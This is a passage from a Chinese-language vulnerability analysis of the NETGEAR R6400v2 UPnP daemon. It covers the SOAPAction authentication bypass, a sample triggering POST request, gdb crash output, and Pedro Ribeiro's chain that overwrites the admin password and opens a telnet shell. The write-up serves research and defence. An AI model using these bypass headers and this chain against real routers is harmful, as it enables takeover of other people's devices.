    LABEL_50:
        v9 = 401;
        return sub_2BCE0(0x20000, aXmlVersion10En_87, v5, v9);
      }
      v35 = strlen(v31);
      strcat(byte_9FA30, "urn:NETGEAR-ROUTER");
      v36 = strlen(byte_9FA30);
      memcpy(&byte_9FA30[v36], v33, v34 + v35 - (_DWORD)v33);
      strcat(byte_9FA30, ":1");
      v37 = sa_processResponse(soap_action_index, request_ptr, v5, v7, v6);  // (4)
在`sa_method_check()`函数中，在`(1)`处查找`POST`请求中的`SOAPAction:`头，`(2)`处在表中查找具体的`SOAPAction`服务并获取对应的类型(索引?)，表中包含的服务名称及其顺序如下。
    .data:0007E380 aDeviceinfo             DCB "DeviceInfo",0      
    .data:0007E39E aDeviceconfig           DCB "DeviceConfig",0
    .data:0007E3BC aWanipconnectio_0     DCB "WANIPConnection",0
    .data:0007E3DA aWanethernetlin_0     DCB "WANEthernetLinkConfig",0
    .data:0007E3F8 aLanconfigsecur         DCB "LANConfigSecurity",0
    .data:0007E416 aWlanconfigurat         DCB "WLANConfiguration",0
    .data:0007E434 aTime                   DCB "Time",0
    .data:0007E452 aParentalcontro         DCB "ParentalControl",0
    .data:0007E470 aAdvancedqos            DCB "AdvancedQoS",0
    .data:0007E48E aUseroptionstc          DCB "UserOptionsTC",0
    .data:0007E4AC aEndOfFile_0            DCB "END_OF_FILE",0
为了使得程序能执行到`(4)`，需要使得`(3)`处的判断条件不成立，即`SOAPAction`头部需包含以下三个之一。在`(3)`处还有一个对`ip`的判断，但这个似乎不太好伪造。
  * `urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate`
  * `urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin`
  * `urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo`
访问以上3个`SOAPAction`是无需认证的，似乎到这里直接发送如下`POST`请求就可以到达溢出漏洞点了。
    POST soap/server_sa/ HTTP/1.1
    SOAPAction: urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin
    SetNetgearDeviceName        // SetDeviceNameIconByMAC 或 SetDeviceInfoByMAC 也行
    123
但是在`sa_processResponse()`函数中，在根据`soap_action`的类型进入分支处理时，`urn:NETGEAR-ROUTER:service:DeviceInfo:1#GetInfo`和`urn:NETGEAR-ROUTER:service:DeviceConfig:1#SOAPLogin`这2项会分别匹配对应`case`
分支的第1条`if`语句，从而跳转到其他地方，而`urn:NETGEAR-ROUTER:service:ParentalControl:1#Authenticate`对应的`case`分支中的跳转都是跳到其他地方。因此，直接访问以上3个`SOAPAction`，程序执行流程不会到达溢出漏洞点。
    unsigned int __fastcall sa_processResponse(int a1, char *a2, int a3, signed int a4, char *a5)
    {
      v5 = (void *)a1; v6 = a2;
      switch ( (unsigned int)v5 )
      {
        case 0u:  // 对应service：DeviceInfo
          if ( sa_findKeyword((int)v6, 0) == 1 ) // GetInfo
            goto LABEL_241;  // (1) 
    SetNetgearDeviceName
    123456
首先，在`sa_method_check()`中，在查找`SOAPAction`服务时，对应的表项`DeviceInfo`排在`DeviceConfig`之前，因此会匹配到`DeviceInfo`，对应的`soap_action`类型为0。其次，在对`SOAPAction`头部进行判断时，某个`strncmp()`会比对成功返回0，使得对应的`if`条件为`false`，程序继续执行后会调用`sa_processResponse()`。在`sa_processResponse()`中，由于`soap_action`的类型为0，程序会进入`case
0`分支，在查找关键字时会匹配到下面的`SetNetgearDeviceName`，因而会跳到对应的分支继续执行，最终到达溢出漏洞点。
## 漏洞利用
现在可以绕过认证并触发溢出漏洞了，该如何对溢出漏洞进行利用呢？溢出时的`crash`信息如下，可以看到，寄存器`r4`~`r8`和`pc`的内容都被覆盖了。
    (gdb) c                                                                   
    Continuing.                                                               
    Program received signal SIGSEGV, Segmentation fault.
    Cannot access memory at address 0x63636362                                
    0x63636362 in ?? ()                                                       
    (gdb) i r                                                                 
    r0             0x0      0                                                 
    r1             0x662bc  418492                                            
    r2             0x662bc  418492                                            
    r3             0xbeece355       3203195733                                
    r4             0x61616161       1633771873                                
    r5             0x61616161       1633771873                                
    r6             0x61616161       1633771873                                
    r7             0x61616161       1633771873                                
    r8             0x62626262       1650614882                                
    r9             0x1      1                                                 
    r10            0x0      0                                                 
    r11            0xbeeccf80       3203190656                                
    r12            0x0      0                                                 
    sp             0xbeeccbb0       0xbeeccbb0                                
    lr             0x24c38  150584                                            
    pc             0x63636362       0x63636362                                
    cpsr           0x60000030       1610612784                                
    (gdb) x/10wx $sp-0x10                                                     
    0xbeeccba0:     0x61616161      0x61616161      0x62626262      0x63636363
    0xbeeccbb0:     0x00000000      0x0000ff37      0x0000041e      0xbeeccf80
    0xbeeccbc0:     0xbeeccf4c      0x00000002
前面提到过，若想要实现任意代码执行，需要解决`NULL`字符截断的问题。在仅有一次覆盖返回地址的机会时，该如何构造`payload`呢?
在有限的条件下，`Pedro
Ribeiro`采取了一种巧妙的方式，通过单次覆盖来修改设备管理员账户的密码，而`upnpd`程序中正好存在这一代码片段。这段代码不依赖于其他的寄存器以及栈空间内容等，跳转执行成功后程序还是会崩溃，但管理员账户的密码已成功修改成`password`。
    ; V1.0.4.82 版本
    .text:00039A58 LDR             R0, =aHttpPasswd ; "http_passwd"
    .text:00039A5C LDR             R1, =aPassword ; "password"
    .text:00039A60 BL              acosNvramConfig_set
有了管理员账户和密码后，可以登录设备的管理界面，对设备的配置进行修改，但如何获取设备的`shell`以实现代码执行呢?`Pedro
Ribeiro`指出，在`R6700v3`型号的设备上，可以通过某种方式开启设备的`telnet`服务，再利用已有的管理员账号和密码登录，即可获取设备的`shell`。
`Pedro Ribeiro`给出的完整利用流程如下：
  * 结合认证绕过漏洞和缓冲区溢出漏洞，通过发送`POST`请求来修改管理员账号的密码；
  * 利用已有的管理员账号和密码，登录web页面，再次修改管理员账号的密码；
  * 通过向设备的`23/udp`端口发送`telnetenable`数据包，以开启`telnet`服务；
  * 利用已有的管理员账号和密码，登录`telnet`服务，即可成功获取设备的`shell`
## 小结
本文从补丁比对出发，结合`Pedro Ribeiro`的`write up`，对`NETGEAR`
`R6400v2`型号设备中的`UPnP`漏洞进行了定位和分析。
  * 认证绕过：在对`SOAPAction`头进行解析和处理时，由于缺乏适当的校验，可通过伪造`SOAPAction`头部来绕过认证，从而访问某些`API`
  * 缓冲区溢出：在解析和处理`POST`请求中的数据时，由于缺乏长度校验，通过伪造超长的数据，最终会造成在`sa_setBlockName()`函数中出现缓冲区溢出
栈溢出漏洞本身比较简单，但漏洞利用却存在`NULL`字符截断的问题，在只有一次覆盖返回地址的机会时，`Pedro
Ribeiro`采用了一种巧妙的方式，值得借鉴和学习。
## 相关链接
  * [(0Day) (Pwn2Own) NETGEAR R6700 UPnP SOAPAction Authentication Bypass Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-20-703/)
  * [(0Day) (Pwn2Own) NETGEAR R6700 UPnP NewBlockSiteName Stack-based Buffer Overflow Remote Code Execution Vulnerability](https://www.zerodayinitiative.com/advisories/ZDI-20-704/)
  * [Security Advisory for Multiple Vulnerabilities on Some Routers, Mobile Routers, Modems, Gateways, and Extenders](https://kb.netgear.com/000061982/Security-Advisory-for-Multiple-Vulnerabilities-on-Some-Routers-Mobile-Routers-Modems-Gateways-and-Extenders)
  * [tokyo_drift](https://github.com/pedrib/PoC/blob/da317bbb22abc2c88c8fcad0668cdb94b2ba0a6f/advisories/Pwn2Own/Tokyo_2019/tokyo_drift/tokyo_drift.md)
  * [SOAP 介绍](https://segmentfault.com/a/1190000003762279)